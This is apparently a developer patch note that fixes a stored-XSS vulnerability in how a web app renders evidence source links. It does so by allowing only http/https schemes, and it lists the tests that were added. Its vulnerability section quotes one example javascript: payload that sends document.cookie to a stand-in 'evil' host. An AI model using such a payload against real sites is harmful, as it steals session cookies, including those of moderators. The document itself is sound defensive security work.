# D-104B — Evidence Source Link Sanitisation

**Date:** 2026-06-10
**Scope:** Frontend-only — `public/app-v10.js`, `public/styles.css`. No Worker, no D1, no Wrangler.
**Static baseline:** 340 / 24 / 39 → **353 / 24 / 39**
**Audit basis:** D-104A source URL / citation safety audit (HIGH finding E.1)

---

## Vulnerability Fixed

D-104A found a **stored-XSS / admin-targeting vector**: `sourceLink` rendered `href="${esc(url)}"` for **any** scheme. `esc()` escapes HTML metacharacters but does **not** validate the URL scheme, and the backend stores/returns `sourceUrl` unfiltered. A submitted source such as:

```
javascript:fetch('https://evil/x?c='+document.cookie)
```

became a clickable evidence link that executes JavaScript **in the HumanX origin** on click. Because evidence enters Review before going public, the first clicker is typically a **moderator using the admin token** — making it an admin-targeting stored XSS, in addition to the public risk after approval. `data:`, `vbscript:`, `blob:`, and `file:` were likewise unfiltered.

This patch ensures **non-http(s) source values are never placed in an anchor `href`**.

---

## What Changed

### 1. New helper `safeHttpUrl(url)`

```js
function safeHttpUrl(url){
  const s=String(url||'').trim();
  if(!s)return null;
  try{
    const u=new URL(s);
    if(u.protocol==='http:'||u.protocol==='https:')return u.href;
    return null;
  }catch(_){return null;}
}
```

- Parses with `new URL()` inside try/catch.
- Returns the URL **only** if the scheme is `http:` or `https:`.
- Returns `null` for everything else.
- Does **not** auto-prefix missing schemes, do domain validation, or use blocklists.

### 2. `sourceLink(url)` rewritten with three branches

| Input | Render |
|---|---|
| empty / whitespace | `<p class="ev-no-source">no source provided</p>` (D-103B, unchanged) |
| safe `http:`/`https:` URL | `<a href="${escaped safe url}" target="_blank" rel="noopener noreferrer">…</a>` (escaped) |
| anything else (unsafe/malformed) | `<p class="ev-bad-source">${esc(raw)} <span class="ev-bad-source-note">not clickable — not a valid web address</span></p>` — **escaped plain text, no href** |

The unsafe value is shown (escaped) so the evidence is **not hidden**, but it is never clickable and never enters an `href`.

### 3. CSS

```css
.ev-bad-source{color:var(--muted);word-break:break-all;margin:2px 0 0}
.ev-bad-source-note{color:var(--yellow);opacity:.8;font-style:italic;font-size:10px;white-space:nowrap}
```

---

## Allowed Schemes

| Scheme | Result |
|---|---|
| `http:` | ✅ clickable link |
| `https:` | ✅ clickable link |
| `javascript:` | ❌ plain text, not clickable |
| `data:` | ❌ plain text |
| `vbscript:` | ❌ plain text |
| `blob:` | ❌ plain text |
| `file:` | ❌ plain text |
| `mailto:` | ❌ plain text (http/https only by design) |
| `//host` (protocol-relative) | ❌ plain text (`new URL` throws without base) |
| `host.com` (scheme-less) | ❌ plain text |
| malformed / empty | ❌ plain text / "no source provided" |

Behavioral coverage verified across all of the above (Section 46 test 46.3).

---

## What Happens to Unsafe / Non-Web Sources

They are rendered as **escaped, non-clickable text** with a neutral note: *"not clickable — not a valid web address."* The wording is deliberately **format-based and neutral** — no "malicious", "blocked", "dangerous", or "unsafe" language — to preserve source-neutrality and avoid implying HumanX judged the source's content. The evidence itself is never hidden, deleted, or down-ranked.

---

## Why This Is Frontend-Only Defense

The fix is applied at **render time**, so it protects every display path (study evidence row, vault evidence card, reused compact row) regardless of what is already stored in D1 — including any malicious values that may have been submitted before this patch. It requires no backend change and takes effect immediately on deploy.

`esc()` already closed the attribute-breakout vector; `rel="noopener noreferrer"` + `target="_blank"` are retained as defense-in-depth. This patch closes the remaining scheme-injection hole.

---

## Follow-up Recommendation

**D-104C (or later) — backend `sourceUrl` validation, defense-in-depth.**
Add server-side scheme validation on `/api/evidence` and `/api/pressure` so non-http(s) values never persist in D1 in the first place, plus a read-only audit query for any existing non-http(s) `source_url` rows (remediated via the normal exact-ID review path, never bulk). This is a Worker change and out of scope for this frontend patch.

---

## Hardening Tests Added (Section 46 — 13 new tests, 340 → 353)

| # | Test |
|---|---|
| 46.1 | `safeHttpUrl` helper exists |
| 46.2 | `safeHttpUrl` only allows http:/https: via `new URL()` |
| 46.3 | Behavioral: http/https allowed; javascript/data/vbscript/blob/file/protocol-relative/scheme-less/mailto/empty rejected |
| 46.4 | `sourceLink` uses `safeHttpUrl` and branches before emitting href |
| 46.5 | `sourceLink` emits exactly one href — the escaped safe URL |
| 46.6 | Unsafe source rendered as non-clickable escaped text with neutral note |
| 46.7 | Anchor retains `rel="noopener noreferrer"` + `target="_blank"` |
| 46.8 | "no source provided" behavior remains (D-103B regression) |
| 46.9 | No "verified/trusted source" wording added |
| 46.10 | Unsafe-source note avoids scary wording (no malicious/blocked/dangerous) |
| 46.11 | D-103B evidence quality behavior remains present |
| 46.12 | `.ev-bad-source` CSS defined |
| 46.13 | No backend/D1/wrangler/deploy references in sanitiser |

The D-103B anchor regression test was updated for the new escaped-variable name (`${e}`).

---

## Safety Confirmation

| Check | Status |
|---|---|
| No backend/schema/API/data changes | ✅ — frontend render-time only |
| No source verification claim added | ✅ — neutral, format-based wording |
| No evidence hidden/deleted | ✅ — unsafe source shown as escaped text |
| No moderation/admin actions | ✅ |
| No deploy/D1/live mutation | ✅ |
| Stored source data untouched | ✅ |

---

## Static Check Results

| Check | Before | After |
|---|---|---|
| `node scripts/hardening-smoke-test.mjs` | 340 passed, 0 failed | **353 passed, 0 failed** |
| `node scripts/belief-engine-static-check.mjs` | 24 passed | **24 passed** |
| `node scripts/worker-route-static-check.mjs` | 39 passed | **39 passed** |
